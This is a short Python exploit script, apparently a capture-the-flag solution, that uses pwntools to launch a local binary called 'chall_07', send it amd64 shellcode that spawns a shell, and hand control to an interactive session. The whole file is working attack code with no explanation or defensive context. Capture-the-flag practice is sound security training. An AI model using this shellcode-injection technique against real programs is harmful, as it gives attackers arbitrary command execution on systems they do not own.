# coding: utf-8
from pwn import *
def exploit():
    proc= process("./chall_07")
    context.arch= "amd64"
    s= asm(shellcraft.sh())
    proc.sendline(s)
    proc.interactive()
    proc.close()
    
exploit()
